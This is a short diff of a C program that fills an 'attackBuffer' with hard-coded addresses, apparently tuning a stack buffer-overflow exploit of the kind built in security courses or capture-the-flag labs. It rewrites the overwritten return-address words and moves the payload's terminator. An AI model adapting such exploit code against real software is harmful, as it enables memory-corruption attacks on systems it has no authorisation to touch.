@@ -22,11 +22,9 @@ int main(void)
 	}
 	
 	*(int *)&attackBuffer[72] = 0x0104ee28;
-	*(int *)&attackBuffer[76] = 0x0104ee78;
-	*(int *)&attackBuffer[80] = 0x3050fe68;
-	*(int *)&attackBuffer[84] = 0x3050fe69;
+	*(int *)&attackBuffer[76] = 0x3050fe68;
 	
-	attackBuffer[88] = NULL;
+	attackBuffer[80] = NULL;
 	
 
 	*(char *)&attackBuffer[4] = 0x77;
